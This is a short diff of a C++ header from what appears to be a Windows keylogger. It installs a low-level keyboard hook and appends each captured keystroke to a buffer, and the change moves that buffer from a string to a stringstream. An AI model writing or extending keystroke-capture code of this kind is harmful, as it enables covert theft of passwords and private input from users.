@@ -2,12 +2,13 @@
 #define key_proc
 
 #include <winuser.h>
+#include <sstream>
 #include "key_codes.h"
 using namespace std;
 
 namespace key_proc
 {
-    string captured = "";
+    stringstream captured;
     //Debug helper
     INPUT change_ks(DWORD vkey)
     {
@@ -30,9 +31,9 @@ namespace key_proc
         KBDLLHOOKSTRUCT *k = ((KBDLLHOOKSTRUCT *)lparam);
         if (wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN)
         {
-            captured += key_codes::kc[k->vkCode].desc;
+            captured << key_codes::kc[k->vkCode].desc;
             if (k->vkCode == VK_RETURN)
-                captured += "\n";
+                captured << "\n";
         }
 
         if (wparam == WM_KEYUP || wparam == WM_SYSKEYUP)
@@ -44,8 +45,8 @@ namespace key_proc
                 for (auto i = 0; i < key_codes::kc[k->vkCode].desc.length(); i++)
                 {
                     if (i == 1)
-                        captured += "\\";
-                    captured += key_codes::kc[k->vkCode].desc[i];
+                        captured << "\\";
+                    captured << key_codes::kc[k->vkCode].desc[i];
                 }
         }
 
